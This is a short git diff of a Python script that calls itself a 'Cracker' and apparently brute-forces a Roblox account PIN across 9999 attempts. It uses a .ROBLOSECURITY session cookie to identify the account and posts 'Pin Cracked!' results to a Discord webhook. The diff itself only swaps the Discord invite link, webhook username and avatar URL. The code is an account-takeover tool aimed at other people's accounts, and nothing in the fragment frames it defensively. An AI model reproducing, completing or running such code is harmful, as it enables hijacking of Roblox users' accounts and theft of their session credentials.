@@ -20,7 +20,7 @@ os.system("cls")
 if pingEveryone.lower == 'y' or pingEveryone == 'yes':
     ping = '@everyone'
 else:
-    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
+    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/KJqqDDFfyn***'
 os.system("cls")
 
 print('''Cracker Has Started.''')
@@ -42,8 +42,8 @@ for i in range(9999):
             username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
             data = {
                 "content" : ping,
-                "username" : "kunai;",
-                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
+                "username" : "xmas_01;",
+                "avatar_url" : "https://cdn.discordapp.com/avatars/1200091633094512732/cea9d0dcf2113adc917e087d0904295a.webp?size=1024&format=webp&width=473&height=473"
             }
             data["embeds"] = [
                 {
